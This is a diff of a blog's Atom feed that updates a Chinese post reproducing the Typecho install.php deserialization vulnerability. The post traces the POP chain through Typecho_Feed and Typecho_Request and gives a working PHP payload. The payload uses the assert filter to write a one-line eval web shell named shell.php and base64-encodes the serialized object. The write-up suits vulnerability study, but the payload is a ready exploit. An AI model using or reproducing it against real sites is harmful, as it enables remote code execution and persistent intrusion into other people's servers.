@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://nt0rrent.xyz/"/>
-  <updated>2017-10-29T14:48:59.283Z</updated>
+  <updated>2017-10-29T14:57:24.585Z</updated>
   <id>http://nt0rrent.xyz/</id>
   
   <author>
@@ -16,15 +16,15 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title></title>
+    <title>typecho反序列化漏洞复现</title>
     <link href="http://nt0rrent.xyz/2017/10/29/typecho/"/>
     <id>http://nt0rrent.xyz/2017/10/29/typecho/</id>
     <published>2017-10-29T14:51:04.482Z</published>
-    <updated>2017-10-29T14:48:59.283Z</updated>
+    <updated>2017-10-29T14:57:24.585Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="typecho反序列化漏洞复现"><a href="#typecho反序列化漏洞复现" class="headerlink" title="typecho反序列化漏洞复现"></a>typecho反序列化漏洞复现</h2><p>###0X00 前言<br>Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。</p>
-<p>###0X01. 漏洞版本<br>V1.1-15.5.12-beta以前</p>
-<p>###0X02 漏洞分析<br>反序列化可控点：install.php 229~235行<br><img src="http://op5cjcnmi.bkt.clouddn.com/1.PNG" alt="此处输入图片的描述"><br>该博客程序判断是否安装的代码如下</p>
+    <content type="html"><![CDATA[<h2 id="typecho反序列化漏洞复现"><a href="#typecho反序列化漏洞复现" class="headerlink" title="typecho反序列化漏洞复现"></a>typecho反序列化漏洞复现</h2><h3 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h3><p>Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。</p>
+<h3 id="0X01-漏洞版本"><a href="#0X01-漏洞版本" class="headerlink" title="0X01. 漏洞版本"></a>0X01. 漏洞版本</h3><p>V1.1-15.5.12-beta以前</p>
+<h3 id="0X02-漏洞分析"><a href="#0X02-漏洞分析" class="headerlink" title="0X02 漏洞分析"></a>0X02 漏洞分析</h3><p>反序列化可控点：install.php 229~235行<br><img src="http://op5cjcnmi.bkt.clouddn.com/1.PNG" alt="此处输入图片的描述"><br>该博客程序判断是否安装的代码如下</p>
 <p><pre><br>//判断是否已经安装<br>if (!isset($_GET[‘finish’]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . ‘/config.inc.php’) &amp;&amp; empty($_SESSION[‘typecho’])) {<br>    exit;<br>}<br>// 挡掉可能的跨站请求<br>if (!empty($_GET) || !empty($_POST)) {<br>    if (empty($_SERVER[‘HTTP_REFERER’])) {<br>        exit;<br>    }</pre></p>
 <pre><code>$parts = parse_url($_SERVER[&apos;HTTP_REFERER&apos;]);
 if (!empty($parts[&apos;port&apos;])) {
@@ -42,8 +42,17 @@ if (empty($parts[&apos;host&apos;]) || $_SERVER[&apos;HTTP_HOST&apos;] != $parts
 </blockquote>
 <p>分别跟进后发现只有Typecho_Feed类可利用，可利用地点如下：<br><img src="http://op5cjcnmi.bkt.clouddn.com/3.PNG" alt="此处输入图片的描述"><br>在290行，如果screenName是不可访问变量，便会调用__get()魔法方法，搜索<strong>get()方法，有好几处，分析后发现在Typecho\</strong>Request类中可以利用。在该类中__get方法调用了get方法，而在get方法中又调用了_applyFilter方法<br><img src="http://op5cjcnmi.bkt.clouddn.com/4.PNG" alt="此处输入图片的描述"></p>
 <p>跟进该方法<br><img src="http://op5cjcnmi.bkt.clouddn.com/5.PNG" alt="此处输入图片的描述"><br>醒目的array_map函数和call_user_func函数。。。<br>至此POP链已经构造完成。</p>
-<p>###0X03 Payload<br>    &lt;?php<br>    class Typecho_Feed{<br>        private $_type = ‘RSS 2.0’;<br>    private $_items;<br>        public function __construct($a)<br>        {<br>            $this-&gt;_items[] = array(‘author’=&gt;$a);<br>        }<br>    }</p>
-<pre><code>class Typecho_Request{
+<h3 id="0X03-Payload"><a href="#0X03-Payload" class="headerlink" title="0X03 Payload"></a>0X03 Payload</h3><pre><code>&lt;?php
+class Typecho_Feed{
+    private $_type = &apos;RSS 2.0&apos;;
+private $_items;
+    public function __construct($a)
+    {
+        $this-&gt;_items[] = array(&apos;author&apos;=&gt;$a);
+    }
+}
+
+class Typecho_Request{
     private $_params = array(&apos;screenName&apos;=&gt;&apos;file_put_contents(&apos;shell.php&apos;, &apos;&lt;?php @eval($_POST[tharavel]);?&gt;&apos;)&apos;);
     private $_filter = array(&apos;assert&apos;);
 }
@@ -57,7 +66,7 @@ echo base64_encode(serialize($exp));
     
     <summary type="html">
     
-      &lt;h2 id=&quot;typecho反序列化漏洞复现&quot;&gt;&lt;a href=&quot;#typecho反序列化漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;typecho反序列化漏洞复现&quot;&gt;&lt;/a&gt;typecho反序列化漏洞复现&lt;/h2&gt;&lt;p&gt;###0X00 前言&lt;br&gt;Type
+      &lt;h2 id=&quot;typecho反序列化漏洞复现&quot;&gt;&lt;a href=&quot;#typecho反序列化漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;typecho反序列化漏洞复现&quot;&gt;&lt;/a&gt;typecho反序列化漏洞复现&lt;/h2&gt;&lt;h3 id=&quot;0X00-前言&quot;&gt;&lt;a h
     
     </summary>
     
